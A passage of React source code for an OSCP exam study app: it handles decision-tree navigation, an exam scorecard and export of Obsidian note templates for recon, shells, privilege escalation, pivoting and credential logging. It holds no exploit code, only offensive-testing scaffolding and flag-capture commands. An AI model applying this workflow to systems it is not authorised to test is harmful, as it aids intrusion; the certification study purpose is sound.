export default function OSCPAdventure() {
  const [history, setHistory] = useState(["start"]);
  const [copied, setCopied] = useState(false);
  const [animKey, setAnimKey] = useState(0);
  const [showAbout, setShowAbout] = useState(false);
  const [showReport, setShowReport] = useState(false);

  // ── EXAM SCORECARD STATE ──────────────────────────────────────────────
  const initMachine = (name) => ({ name, local: false, proof: false, notes: "" });
  const [machines, setMachines] = React.useState({
    ad1:  initMachine("AD Machine 1"),
    ad2:  initMachine("AD Machine 2"),
    adc:  initMachine("AD Domain Controller"),
    sa1:  initMachine("Standalone 1"),
    sa2:  initMachine("Standalone 2"),
    sa3:  initMachine("Standalone 3"),
  });
  const [metasploitUsed, setMetasploitUsed] = React.useState("");
  const [osid, setOsid] = React.useState("");
  const [examNotes, setExamNotes] = React.useState("");

  const toggleFlag = (machineKey, flag) => {
    setMachines(prev => ({
      ...prev,
      [machineKey]: { ...prev[machineKey], [flag]: !prev[machineKey][flag] }
    }));
  };

  const calcScore = () => {
    let score = 0;
    const { ad1, ad2, adc, sa1, sa2, sa3 } = machines;
    // AD: only scores if DC is fully owned
    if (adc.proof) {
      if (ad1.local) score += 10;
      if (ad2.local) score += 10;
      score += 20; // DC proof
    }
    // Standalones: partial points allowed
    [sa1, sa2, sa3].forEach(m => {
      if (m.local) score += 10;
      if (m.proof) score += 10;
    });
    return score;
  };
  const topRef = useRef(null);

  const currentId = history[history.length - 1];
  const node = nodes[currentId] || nodes['start'];
  const phase = PHASES[node?.phase] || PHASES.RECON;

  const go = (next) => {
    setHistory((h) => [...h, next]);
    setAnimKey((k) => k + 1);
    setTimeout(() => topRef.current?.scrollIntoView({ behavior: "smooth", block: "start" }), 50);
  };

  const back = () => {
    if (history.length > 1) {
      setHistory((h) => h.slice(0, -1));
      setAnimKey((k) => k + 1);
    }
  };

  const reset = () => {
    setHistory(["start"]);
    setAnimKey((k) => k + 1);
  };

  const copyCmd = () => {
    if (node.cmd) {
      navigator.clipboard.writeText(node.cmd);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    }
  };

  const [copiedMd, setCopiedMd] = useState(false);

  const copyObsidian = () => {
    const lines = [];
    const now = new Date();
    const ts = now.toISOString().slice(0,10) + ' ' + now.toTimeString().slice(0,5);

    // ── YAML FRONTMATTER ─────────────────────
    lines.push('---');
    lines.push(`title: "${node.title}"`);
    lines.push(`phase: ${node.phase}`);
    lines.push(`node: ${currentId}`);
    lines.push(`date: ${ts}`);
    lines.push(`ip: ""`);
    lines.push(`status: in-progress`);
    // Auto-tag by phase
    const phaseTagMap = {
      RECON: ['recon','enum'], WEB: ['web','enum'], SHELL: ['shell','initial-access'],
      WINDOWS: ['windows','privesc'], LINUX: ['linux','privesc'], AD: ['ad','domain'],
      SMB: ['smb','enum'], PIVOT: ['pivot','tunnel'], CREDS: ['creds','loot'],
      FTP: ['ftp','enum'], SSH: ['ssh','enum'], ANALYSIS: ['analysis'],
      DISCOVERY: ['discovery','recon'], MINDSET: ['mindset'],
      REPORT: ['report'], JUMP: ['reference']
    };
    const tags = phaseTagMap[node.phase] || ['oscp'];
    lines.push(`tags: [${tags.map(t => `"${t}"`).join(', ')}]`);
    lines.push('---');
    lines.push('');

    // ── HEADER ────────────────────────────────
    lines.push(`# ${node.title}`);
    lines.push(`> **${node.phase}** · \`${currentId}\` · ${ts}`);
    lines.push('');

    // ── GUIDANCE + WARN ───────────────────────
    lines.push('## Guidance');
    lines.push(node.body);
    lines.push('');
    if (node.warn) {
      lines.push('> [!warning]');
      lines.push(`> ${node.warn}`);
      lines.push('');
    }

    // ── COMMANDS ──────────────────────────────
    if (node.cmd) {
      lines.push('## Commands');
      lines.push('```bash');
      lines.push(node.cmd);
      lines.push('```');
      lines.push('');
    }

    // ── PHASE-SPECIFIC LIVE NOTE BLOCKS ───────
    const phase = node.phase;

    if (phase === 'RECON' || phase === 'DISCOVERY') {
      lines.push('## Target');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| IP | |');
      lines.push('| Hostname | |');
      lines.push('| OS | |');
      lines.push('');
      lines.push('## Ports Found');
      lines.push('| Port | Service | Version | Notes |');
      lines.push('|------|---------|---------|-------|');
      lines.push('| | | | |');
      lines.push('');
      lines.push('## Searchsploit Hits');
      lines.push('```');
      lines.push('# searchsploit --nmap targeted.xml output here');
      lines.push('```');
      lines.push('');
    }

    else if (phase === 'WEB') {
      lines.push('## Web Target');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| URL | |');
      lines.push('| Tech Stack | |');
      lines.push('| App / Version | |');
      lines.push('| Login Page | |');
      lines.push('');
      lines.push('## Directories Found');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
      lines.push('## Credentials Tried');
      lines.push('| Username | Password | Result |');
      lines.push('|----------|----------|--------|');
      lines.push('| | | |');
      lines.push('');
    }

    else if (phase === 'SMB' || phase === 'FTP' || phase === 'SSH') {
      lines.push('## Service Details');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| Version | |');
      lines.push('| Null/Anon session | Y / N |');
      lines.push('| Searchsploit hit | |');
      lines.push('');
      lines.push('## Shares / Files Found');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
      lines.push('## Credentials Tried');
      lines.push('| Username | Password | Result |');
      lines.push('|----------|----------|--------|');
      lines.push('| | | |');
      lines.push('');
    }

    else if (phase === 'SHELL') {
      lines.push('## Shell Details');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| Payload used | |');
      lines.push('| Delivery method | |');
      lines.push('| LHOST | |');
      lines.push('| LPORT | |');
      lines.push('| Shell type caught | |');
      lines.push('| Stabilized | Y / N |');
      lines.push('');
      lines.push('## Shell Output');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
    }

    else if (phase === 'LINUX') {
      lines.push('## Foothold');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| User | |');
      lines.push('| Shell | |');
      lines.push('| Privesc vector | |');
      lines.push('');
      lines.push('## Key Findings');
      lines.push('```bash');
      lines.push('# whoami && id && hostname && ip a');
      lines.push('');
      lines.push('```');
      lines.push('');
      lines.push('> [!important] Proof Capture');
      lines.push('> `cat /root/proof.txt` + `ip addr` in same screenshot');
      lines.push('> Must be interactive shell — not webshell');
      lines.push('');
      lines.push('## proof.txt');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
    }

    else if (phase === 'WINDOWS') {
      lines.push('## Foothold');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| User | |');
      lines.push('| Integrity | Medium / High / SYSTEM |');
      lines.push('| OS / Build | |');
      lines.push('| Privesc vector | |');
      lines.push('');
      lines.push('## Key Findings');
      lines.push('```');
      lines.push('# whoami /priv output');
      lines.push('');
      lines.push('```');
      lines.push('');
      lines.push('> [!important] Proof Capture');
      lines.push('> `type proof.txt` + `ipconfig` in same screenshot');
      lines.push('> Must be SYSTEM or Administrator — interactive shell');
      lines.push('');
      lines.push('## proof.txt');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
    }

    else if (phase === 'AD') {
      lines.push('## Domain Details');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| Domain | |');
      lines.push('| DC IP | |');
      lines.push('| Current User | |');
      lines.push('| BloodHound path | |');
      lines.push('');
      lines.push('## Users / Groups Found');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
      lines.push('## Credentials');
      lines.push('| User | Password / Hash | Source |');
      lines.push('|------|-----------------|--------|');
      lines.push('| | | |');
      lines.push('');
    }

    else if (phase === 'PIVOT') {
      lines.push('## Tunnel Details');
      lines.push('| Field | Value |');
      lines.push('|-------|-------|');
      lines.push('| Pivot host | |');
      lines.push('| Internal subnet | |');
      lines.push('| Tunnel type | |');
      lines.push('| Route added | |');
      lines.push('');
      lines.push('## Internal Hosts Found');
      lines.push('| IP | Ports | Notes |');
      lines.push('|----|-------|-------|');
      lines.push('| | | |');
      lines.push('');
    }

    else if (phase === 'CREDS') {
      lines.push('## Credentials Log');
      lines.push('| Username | Password | Hash | Service | Source |');
      lines.push('|----------|----------|------|---------|--------|');
      lines.push('| | | | | |');
      lines.push('');
      lines.push('## Cracked Hashes');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
    }

    else {
      // Generic fallback for ANALYSIS, MINDSET, JUMP, REPORT
      lines.push('## What I Found');
      lines.push('```');
      lines.push('');
      lines.push('```');
      lines.push('');
    }

    // ── NEXT MOVE (all phases) ─────────────────
    lines.push('## Next Move');
    lines.push('');
    node.choices.forEach(c => {
      lines.push(`- [ ] ${c.label} → \`${c.next}\``);
    });
    lines.push('');

    // ── PATH BREADCRUMB ───────────────────────
    if (history && history.length > 0) {
      lines.push('## Path Taken');
      lines.push('`' + [...history, currentId].join(' → ') + '`');
      lines.push('');
    }

    lines.push('---');
    lines.push('*The Path — OSCP Field Guide*');
    navigator.clipboard.writeText(lines.join('\n'));
    setCopiedMd(true);
    setTimeout(() => setCopiedMd(false), 1800);
  };

  const phaseList = history.map((h) => nodes[h]?.phase).filter(Boolean);

  useEffect(() => {
    const handleKey = (e) => {
      if (showAbout) { if (e.key === "Escape") setShowAbout(false); return; }
      if (showReport) { if (e.key === "Escape") setShowReport(false); return; }
      if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
      const num = parseInt(e.key);
      if (!isNaN(num) && num >= 1 && num <= node.choices.length) {
        go(node.choices[num - 1].next);
      }
      if (e.key === "Backspace" || e.key === "ArrowLeft") back();
      if (e.key === "r" || e.key === "R") reset();
      if (e.key === "?" || e.key === "a" || e.key === "A") setShowAbout(true);
      if (e.key === "e" || e.key === "E") setShowReport(true);
    };
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, [node, history, showAbout]);

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080b0f",
      color: "#cdd6e0",
      fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
    }}>

      {/* ── HEADER ─────────────────────────── */}
      <header ref={topRef} style={{
        width: "100%",
        background: "linear-gradient(180deg, #0c1018 0%, #080b0f 100%)",
        borderBottom: `1px solid ${phase.color}33`,
        padding: "14px 28px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        position: "sticky",
        top: 0,
        zIndex: 20,
        boxSizing: "border-box",
        boxShadow: `0 1px 30px ${phase.color}18`,
        transition: "border-color 0.4s, box-shadow 0.4s",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", flexDirection: "column", lineHeight: 1.1 }}>
            <div style={{
              fontSize: 17,
              fontWeight: 800,
              letterSpacing: 5,
              color: phase.color,
              textShadow: `0 0 16px ${phase.color}`,
              textTransform: "uppercase",
              transition: "color 0.4s, text-shadow 0.4s",
            }}>
              THE PATH
            </div>
            <div style={{
              fontSize: 10,
              letterSpacing: 3,
              color: "#3a4858",
              textTransform: "uppercase",
              marginTop: 2,
            }}>
              OSCP Field Guide
            </div>
          </div>
          <div style={{
            width: 1,
            height: 16,
            background: "#2a3040",
          }} />
          <div style={{
            fontSize: 17,
            letterSpacing: 3,
            color: "#4a5568",
            textTransform: "uppercase",
          }}>
            {phase.icon} {node.phase}
          </div>
        </div>

        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
          <a
            href="https://github.com/jimi421/patha"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: "#8899aa",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 15,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              textDecoration: "none",
              transition: "all 0.2s",
              display: "flex",
              alignItems: "center",
              gap: 6,
            }}
            onMouseEnter={e => e.currentTarget.style.borderColor = "#3a4858"}
            onMouseLeave={e => e.currentTarget.style.borderColor = "#1e2838"}
          >
            ⎇ github
          </a>
          <button
            onClick={() => setShowAbout(true)}
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: "#8899aa",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 15,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.borderColor = "#3a4858"}
            onMouseLeave={e => e.currentTarget.style.borderColor = "#1e2838"}
          >? about</button>
          <button
            onClick={() => setShowReport(true)}
            style={{
              background: "transparent",
              border: "1px solid #e53e3e44",
              color: "#e53e3e",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 15,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.borderColor = "#e53e3e99"}
            onMouseLeave={e => e.currentTarget.style.borderColor = "#e53e3e44"}
          >⬡ exam</button>
          <button
            onClick={back}
            disabled={history.length <= 1}
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: history.length > 1 ? "#8899aa" : "#2a3040",
              padding: "5px 12px",
              cursor: history.length > 1 ? "pointer" : "default",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => { if (history.length > 1) e.currentTarget.style.borderColor = "#3a4858"; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = "#1e2838"; }}
          >← back</button>

          <button
            onClick={reset}
            style={{
              background: "transparent",
              border: "1px solid #3a1a1a",
              color: "#ff4d6a",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.background = "#ff4d6a18"}
            onMouseLeave={e => e.currentTarget.style.background = "transparent"}
          >⟳ reset</button>
        </div>
      </header>

      {/* ── BREADCRUMB TRAIL ───────────────── */}
      <div style={{
        width: "100%",
        maxWidth: 1100,
        padding: "10px 28px 4px",
        boxSizing: "border-box",
        display: "flex",
        alignItems: "center",
        gap: 6,
        flexWrap: "wrap",
        fontSize: 13,
        color: "#3a4858",
        letterSpacing: 1,
        overflowX: "auto",
      }}>
        <span style={{ color: "#2a3848", fontSize: 11, letterSpacing: 2, textTransform: "uppercase", marginRight: 4 }}>path:</span>
        {history.map((h, i) => {
          const n = nodes[h];
          const p = PHASES[n?.phase] || PHASES.RECON;
          const isCurrent = i === history.length - 1;
          return (
            <span key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span
                onClick={() => {
                  if (!isCurrent) setHistory(prev => prev.slice(0, i + 1));
                }}
                style={{
                  color: isCurrent ? p.color : "#3a5068",
                  cursor: isCurrent ? "default" : "pointer",
                  background: isCurrent ? `${p.color}12` : "transparent",
                  border: isCurrent ? `1px solid ${p.color}30` : "1px solid transparent",
                  borderRadius: 2,
                  padding: "1px 6px",
                  fontSize: 12,
                  letterSpacing: 1,
                  textTransform: "uppercase",
                  transition: "all 0.2s",
                  whiteSpace: "nowrap",
                }}
                title={isCurrent ? "" : `Jump back to ${n?.title}`}
              >
                {p.icon} {n?.title?.replace(/[^a-zA-Z0-9 \-→]/g, "").trim().slice(0, 22) || h}
              </span>
              {i < history.length - 1 && (
                <span style={{ color: "#1e2838", fontSize: 10 }}>›</span>
              )}
            </span>
          );
        })}
        <span style={{ marginLeft: "auto", color: "#2a3848", fontSize: 11, letterSpacing: 1 }}>
          step {history.length} · press 1-9 to choose · backspace = back
        </span>
      </div>

      {/* ── MAIN CARD ──────────────────────── */}
      <main style={{
        width: "100%",
        maxWidth: 1100,
        padding: "16px 28px 48px",
        boxSizing: "border-box",
      }}>
        <div
          key={animKey}
          style={{
            animation: "fadeSlide 0.25s ease-out both",
          }}
        >
          {/* Card */}
          <div style={{
            background: "#0c1018",
            border: `1px solid ${phase.color}2a`,
            borderRadius: 6,
            overflow: "hidden",
            boxShadow: `0 0 60px ${phase.color}0d`,
            transition: "border-color 0.4s, box-shadow 0.4s",
          }}>

            {/* Card top bar */}
            <div style={{
              background: `linear-gradient(90deg, ${phase.color}14 0%, transparent 70%)`,
              borderBottom: `1px solid ${phase.color}20`,
              padding: "18px 24px 14px",
            }}>
              <div style={{
                fontSize: 16,
                letterSpacing: 4,
                color: phase.color,
                textTransform: "uppercase",
                marginBottom: 8,
                opacity: 0.7,
              }}>
                {`[ ${node.phase} // STEP ${history.length} ]`}
              </div>
              <h1 style={{
                margin: 0,
                fontSize: 26,
                fontWeight: 700,
                color: "#e8f0f8",
                letterSpacing: 0.5,
                lineHeight: 1.2,
              }}>
                {node.title}
              </h1>
            </div>

            {/* Card body */}
            <div style={{ padding: "20px 24px 24px" }}>

              {/* Body text */}
              <p style={{
                margin: "0 0 20px",
                fontSize: 17,
                lineHeight: 1.9,
                color: "#8899aa",
                paddingLeft: 14,
                borderLeft: `2px solid ${phase.color}55`,
              }}>
                {node.body}
              </p>

              {/* Warning */}
              {node.warn && (
                <div style={{
                  background: "#1a1200",
                  border: "1px solid #ffd16633",
                  borderLeft: "3px solid #ffd166",
                  borderRadius: "0 4px 4px 0",
                  padding: "10px 14px",
                  marginBottom: 20,
                  fontSize: 15,
                  color: "#ffd166cc",
                  lineHeight: 1.6,
                }}>
                  ⚠ {node.warn}
                </div>
              )}

              {/* Commands */}
              {node.cmd && (
                <div style={{ marginBottom: 24 }}>
                  <div style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: 6,
                  }}>
                    <span style={{
                      fontSize: 16,
                      letterSpacing: 3,
                      color: phase.color,
                      textTransform: "uppercase",
                      opacity: 0.8,
                    }}>
                      commands
                    </span>
                    <div style={{ display: "flex", gap: 8 }}>
                    <button
                      onClick={copyCmd}
                      style={{
                        background: copied ? `${phase.color}22` : "transparent",
                        border: `1px solid ${phase.color}44`,
                        color: phase.color,
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copied ? "✓ copied" : "copy"}
                    </button>
                    <button
                      onClick={copyObsidian}
                      style={{
                        background: copiedMd ? "#7c3aed22" : "transparent",
                        border: "1px solid #7c3aed55",
                        color: copiedMd ? "#a78bfa" : "#7c3aed",
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copiedMd ? "✓ vault" : "⟡ obsidian"}
                    </button>
                    </div>
                  </div>
                  <pre style={{
                    background: "#060a0e",
                    border: `1px solid #1a2838`,
                    borderLeft: `3px solid ${phase.color}88`,
                    padding: "16px 18px",
                    margin: 0,
                    fontSize: 15,
                    lineHeight: 1.75,
                    color: "#7ecb9e",
                    overflowX: "auto",
                    borderRadius: "0 4px 4px 0",
                    whiteSpace: "pre",
                  }}>
                    {node.cmd}
                  </pre>
                </div>
              )}

              {/* Choices */}
              <div>
                <div style={{
                  fontSize: 16,
                  letterSpacing: 3,
                  color: "#3a4858",
                  textTransform: "uppercase",
                  marginBottom: 10,
                }}>
                  what did you find?
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {node.choices.map((c, i) => {
                    const np = nodes[c.next];
                    const nc = PHASES[np?.phase]?.color || phase.color;
                    return (
                      <button
                        key={i}
                        onClick={() => go(c.next)}
                        style={{
                          background: `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`,
                          border: `1px solid ${nc}30`,
                          borderLeft: `3px solid ${nc}66`,
                          color: "#8899aa",
                          padding: "11px 16px",
                          cursor: "pointer",
                          fontFamily: "inherit",
                          fontSize: 16,
                          textAlign: "left",
                          borderRadius: "0 4px 4px 0",
                          transition: "all 0.15s",
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                        }}
                        onMouseEnter={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}1a 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = nc;
                          e.currentTarget.style.color = "#ddeeff";
                        }}
                        onMouseLeave={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = `${nc}66`;
                          e.currentTarget.style.color = "#8899aa";
                        }}
                      >
                        <span style={{
                          fontSize: 16,
                          color: nc,
                          opacity: 0.8,
                          minWidth: 14,
                          fontWeight: 700,
                        }}>▶</span>
                        {c.label}
                        <span style={{
                          marginLeft: "auto",
                          fontSize: 16,
                          color: nc,
                          opacity: 0.5,
                          letterSpacing: 1,
                          textTransform: "uppercase",
                        }}>
                          {np?.phase}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ── LEGEND ───────────────────────── */}
        <div style={{
          marginTop: 28,
          display: "flex",
          gap: 14,
          flexWrap: "wrap",
          justifyContent: "center",
          fontSize: 16,
          letterSpacing: 2,
          color: "#3a4858",
          textTransform: "uppercase",
        }}>
          {Object.entries(PHASES).filter(([k]) => !["FTP","SSH"].includes(k)).map(([label, { color: c, icon }]) => (
            <div key={label} style={{ display: "flex", alignItems: "center", gap: 5, opacity: node.phase === label ? 1 : 0.5, transition: "opacity 0.3s" }}>
              <div style={{ width: 6, height: 6, background: c, borderRadius: 1, boxShadow: node.phase === label ? `0 0 8px ${c}` : "none", transition: "box-shadow 0.3s" }} />
              {label}
            </div>
          ))}
        </div>
      </main>

      {/* ── EXAM REPORT MODAL ───────────────────── */}
      {showReport && (
        <div
          onClick={() => setShowReport(false)}
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.92)",
            zIndex: 100,
            display: "flex",
            alignItems: "flex-start",
            justifyContent: "center",
            padding: "24px 16px",
            overflowY: "auto",
          }}
        >
          <div
            onClick={e => e.stopPropagation()}
            style={{
              background: "#0c1018",
              border: "1px solid #e53e3e33",
              borderRadius: 8,
              padding: "32px 36px",
              maxWidth: 720,
              width: "100%",
              fontFamily: "inherit",
              boxShadow: "0 0 80px #e53e3e11",
              marginBottom: 24,
            }}
          >
            {/* Header */}
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 28 }}>
              <div>
                <div style={{ fontSize: 20, fontWeight: 800, letterSpacing: 4, color: "#e53e3e", textTransform: "uppercase" }}>
                  Exam Scorecard
                </div>
                <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginTop: 4 }}>
                  OSCP+ · 70pts to pass · 23:45 exam · 24hr report window
                </div>
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ fontSize: 36, fontWeight: 900, color: calcScore() >= 70 ? "#7ecb9e" : calcScore() >= 50 ? "#f6ad55" : "#e53e3e", letterSpacing: 2 }}>
                  {calcScore()}
                </div>
                <div style={{ fontSize: 11, letterSpacing: 2, color: "#3a4858", textTransform: "uppercase" }}>/ 100 pts</div>
              </div>
            </div>

            {/* OSID */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>Your OSID</div>
              <input
                value={osid}
                onChange={e => setOsid(e.target.value)}
                placeholder="OS-XXXXX"
                style={{
                  background: "#060a0e", border: "1px solid #1e2838", color: "#cdd6e0",
                  padding: "6px 12px", fontFamily: "inherit", fontSize: 14, borderRadius: 2,
                  width: 160, letterSpacing: 2,
                }}
              />
              {osid && (
                <div style={{ fontSize: 11, color: "#3a4858", marginTop: 6, letterSpacing: 1 }}>
                  Report filename: <span style={{ color: "#7ecb9e" }}>OSCP-{osid}-Exam-Report.pdf</span>
                  {" → "}<span style={{ color: "#7ecb9e" }}>OSCP-{osid}-Exam-Report.7z</span>
                </div>
              )}
            </div>

            {/* Score breakdown */}
            <div style={{ marginBottom: 28 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 12 }}>
                Score Tracker
              </div>

              {/* AD Section */}
              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: "16px", marginBottom: 8 }}>
                <div style={{ fontSize: 11, letterSpacing: 3, color: "#7c3aed", textTransform: "uppercase", marginBottom: 10 }}>
                  Active Directory Set — 40pts total
                </div>
                <div style={{ fontSize: 10, color: "#3a4858", marginBottom: 10, letterSpacing: 1 }}>
                  ⚠ AD only scores if DC is fully compromised — no partial AD points
                </div>
                {["ad1","ad2","adc"].map(key => {
                  const m = machines[key];
                  const isdc = key === "adc";
                  return (
                    <div key={key} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8, padding: "6px 0", borderBottom: "1px solid #0e1420" }}>
                      <div style={{ width: 160, fontSize: 13, color: "#8899aa" }}>{m.name}</div>
                      {!isdc ? (
                        <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: machines[key].local ? "#7ecb9e" : "#3a4858" }}>
                          <input type="checkbox" checked={m.local} onChange={() => toggleFlag(key, "local")}
                            style={{ accentColor: "#7ecb9e" }} />
                          local.txt +10
                        </label>
                      ) : (
                        <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: machines[key].proof ? "#7ecb9e" : "#3a4858" }}>
                          <input type="checkbox" checked={m.proof} onChange={() => toggleFlag(key, "proof")}
                            style={{ accentColor: "#7ecb9e" }} />
                          proof.txt +20
                        </label>
                      )}
                    </div>
                  );
                })}
              </div>

              {/* Standalone machines */}
              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: "16px" }}>
                <div style={{ fontSize: 11, letterSpacing: 3, color: "#3b9eff", textTransform: "uppercase", marginBottom: 10 }}>
                  Standalone Machines — 60pts total
                </div>
                {["sa1","sa2","sa3"].map(key => {
                  const m = machines[key];
                  return (
                    <div key={key} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8, padding: "6px 0", borderBottom: "1px solid #0e1420" }}>
                      <div style={{ width: 160, fontSize: 13, color: "#8899aa" }}>{m.name}</div>
                      <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: m.local ? "#7ecb9e" : "#3a4858" }}>
                        <input type="checkbox" checked={m.local} onChange={() => toggleFlag(key, "local")}
                          style={{ accentColor: "#7ecb9e" }} />
                        local.txt +10
                      </label>
                      <label style={{ display: "flex", alignItems: "center", gap: 5, cursor: "pointer", fontSize: 12, color: m.proof ? "#7ecb9e" : "#3a4858" }}>
                        <input type="checkbox" checked={m.proof} onChange={() => toggleFlag(key, "proof")}
                          style={{ accentColor: "#7ecb9e" }} />
                        proof.txt +10
                      </label>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Metasploit tracker */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>
                Metasploit Usage — 1 machine only
              </div>
              <div style={{ fontSize: 11, color: "#3a4858", marginBottom: 8, letterSpacing: 1 }}>
                Cannot be used for pivoting. Lock in your choice before you use it.
              </div>
              <select
                value={metasploitUsed}
                onChange={e => setMetasploitUsed(e.target.value)}
                style={{
                  background: "#060a0e", border: "1px solid #1e2838", color: metasploitUsed ? "#f6ad55" : "#3a4858",
                  padding: "6px 12px", fontFamily: "inherit", fontSize: 13, borderRadius: 2, width: 200,
                }}
              >
                <option value="">— not used yet —</option>
                <option value="AD Machine 1">AD Machine 1</option>
                <option value="AD Machine 2">AD Machine 2</option>
                <option value="AD Domain Controller">AD Domain Controller</option>
                <option value="Standalone 1">Standalone 1</option>
                <option value="Standalone 2">Standalone 2</option>
                <option value="Standalone 3">Standalone 3</option>
              </select>
              {metasploitUsed && (
                <div style={{ fontSize: 11, color: "#f6ad55", marginTop: 6, letterSpacing: 1 }}>
                  ⚠ Metasploit locked to: {metasploitUsed}
                </div>
              )}
            </div>

            {/* Proof capture checklist */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 10 }}>
                Proof Capture Requirements
              </div>
              <div style={{ background: "#060a0e", border: "1px solid #e53e3e22", borderRadius: 4, padding: 16, fontSize: 12, lineHeight: 2, color: "#6a7a8a" }}>
                <div>✦ <span style={{ color: "#cdd6e0" }}>Linux:</span> <code style={{ color: "#7ecb9e" }}>cat /root/proof.txt</code> + <code style={{ color: "#7ecb9e" }}>ip addr</code> — same screenshot</div>
                <div>✦ <span style={{ color: "#cdd6e0" }}>Windows:</span> <code style={{ color: "#7ecb9e" }}>type proof.txt</code> + <code style={{ color: "#7ecb9e" }}>ipconfig</code> — same screenshot</div>
                <div>✦ Must be an <span style={{ color: "#e53e3e" }}>interactive shell</span> — webshell = zero points</div>
                <div>✦ Linux must be <span style={{ color: "#e53e3e" }}>root</span> — Windows must be <span style={{ color: "#e53e3e" }}>SYSTEM or Administrator</span></div>
                <div>✦ Submit flag hash to control panel <span style={{ color: "#e53e3e" }}>before exam ends</span></div>
                <div>✦ local.txt = low-priv shell · proof.txt = root/SYSTEM</div>
                <div>✦ Run from the <span style={{ color: "#cdd6e0" }}>directory where the file lives</span></div>
              </div>
            </div>

            {/* Report assembly checklist */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 10 }}>
                Report Assembly — 24hr window after exam
